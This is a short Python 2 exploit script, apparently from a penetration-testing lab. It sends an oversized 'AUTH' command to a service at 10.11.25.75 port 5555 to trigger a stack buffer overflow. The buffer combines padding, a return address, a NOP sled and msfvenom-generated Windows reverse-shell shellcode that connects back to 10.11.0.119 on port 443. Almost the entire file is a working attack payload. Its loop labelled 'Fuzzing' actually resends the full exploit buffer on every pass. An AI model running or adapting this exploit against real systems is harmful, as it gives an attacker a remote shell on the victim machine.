#!/usr/bin/python
import socket

#msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.119 LPORT=443 -f c -a x86 -b "\x00\x0a" --platform windows

shellcode = (
"\xbf\xcb\xfd\xac\xbe\xd9\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x7b\x12\x83\xc3\x04\x03\xb0\xf3\x4e\x4b\xba\xe4\x0d"
"\xb4\x42\xf5\x71\x3c\xa7\xc4\xb1\x5a\xac\x77\x02\x28\xe0\x7b"
"\xe9\x7c\x10\x0f\x9f\xa8\x17\xb8\x2a\x8f\x16\x39\x06\xf3\x39"
"\xb9\x55\x20\x99\x80\x95\x35\xd8\xc5\xc8\xb4\x88\x9e\x87\x6b"
"\x3c\xaa\xd2\xb7\xb7\xe0\xf3\xbf\x24\xb0\xf2\xee\xfb\xca\xac"
"\x30\xfa\x1f\xc5\x78\xe4\x7c\xe0\x33\x9f\xb7\x9e\xc5\x49\x86"
"\x5f\x69\xb4\x26\x92\x73\xf1\x81\x4d\x06\x0b\xf2\xf0\x11\xc8"
"\x88\x2e\x97\xca\x2b\xa4\x0f\x36\xcd\x69\xc9\xbd\xc1\xc6\x9d"
"\x99\xc5\xd9\x72\x92\xf2\x52\x75\x74\x73\x20\x52\x50\xdf\xf2"
"\xfb\xc1\x85\x55\x03\x11\x66\x09\xa1\x5a\x8b\x5e\xd8\x01\xc4"
"\x93\xd1\xb9\x14\xbc\x62\xca\x26\x63\xd9\x44\x0b\xec\xc7\x93"
"\x6c\xc7\xb0\x0b\x93\xe8\xc0\x02\x50\xbc\x90\x3c\x71\xbd\x7a"
"\xbc\x7e\x68\x2c\xec\xd0\xc3\x8d\x5c\x91\xb3\x65\xb6\x1e\xeb"
"\x96\xb9\xf4\x84\x3d\x40\x9f\xa0\xca\x4a\x28\xdd\xce\x4a\xd7"
"\xa6\x46\xac\xbd\xc8\x0e\x67\x2a\x70\x0b\xf3\xcb\x7d\x81\x7e"
"\xcb\xf6\x26\x7f\x82\xfe\x43\x93\x73\x0f\x1e\xc9\xd2\x10\xb4"
"\x65\xb8\x83\x53\x75\xb7\xbf\xcb\x22\x90\x0e\x02\xa6\x0c\x28"
"\xbc\xd4\xcc\xac\x87\x5c\x0b\x0d\x09\x5d\xde\x29\x2d\x4d\x26"
"\xb1\x69\x39\xf6\xe4\x27\x97\xb0\x5e\x86\x41\x6b\x0c\x40\x05"
"\xea\x7e\x53\x53\xf3\xaa\x25\xbb\x42\x03\x70\xc4\x6b\xc3\x74"
"\xbd\x91\x73\x7a\x14\x12\x83\x31\x34\x33\x0c\x9c\xad\x01\x51"
"\x1f\x18\x45\x6c\x9c\xa8\x36\x8b\xbc\xd9\x33\xd7\x7a\x32\x4e"
"\x48\xef\x34\xfd\x69\x3a" )

buffer='A'*1040+'\x71\x1D\xD1\x65'+ "\x90"*16 + shellcode + 'C'*(1400-1040-4-351)

for string in buffer:
	print "Fuzzing PASS with %s bytes" % len(string)
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('10.11.25.75',5555))
	s.recv(1024)
	s.send('AUTH ' + buffer)
	s.send('QUIT\r\n')
	s.close()


